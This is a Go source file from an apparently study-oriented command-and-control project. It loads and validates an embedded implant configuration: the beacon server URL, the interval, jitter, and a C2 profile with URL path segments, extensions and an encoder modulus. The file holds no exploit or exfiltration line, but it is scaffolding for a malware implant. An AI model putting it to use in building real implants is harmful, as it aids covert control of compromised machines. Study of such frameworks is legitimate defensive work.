package config

import (
	_ "embed"
	"encoding/json"
	"errors"

	"xhc2_for_studying/protocol"
)

//go:embed implant.json
var embeddedConfig []byte

type BeaconConfig struct {
	ServerURL string            `json:"server_url"`
	Interval  int64             `json:"interval"`
	Jitter    int64             `json:"jitter"`
	C2Profile protocol.C2Profile `json:"c2_profile"`
}

func Load() (*BeaconConfig, error) {
	var cfg BeaconConfig
	if err := json.Unmarshal(embeddedConfig, &cfg); err != nil {
		return nil, err
	}
	if err := cfg.Validate(); err != nil {
		return nil, err
	}
	return &cfg, nil
}

func (c *BeaconConfig) Validate() error {
	if c == nil {
		return errors.New("beacon config is nil")
	}
	if c.ServerURL == "" {
		return errors.New("server_url is required")
	}
	if c.Interval <= 0 {
		return errors.New("interval must be greater than zero")
	}
	if c.Jitter < 0 {
		return errors.New("jitter must be greater than or equal to zero")
	}
	if len(c.C2Profile.PathSegments) == 0 {
		return errors.New("c2_profile.path_segments is required")
	}
	if len(c.C2Profile.Extensions) == 0 {
		return errors.New("c2_profile.extensions is required")
	}
	if c.C2Profile.EncoderModulus <= 0 {
		return errors.New("c2_profile.encoder_modulus must be > 0")
	}
	return nil
}
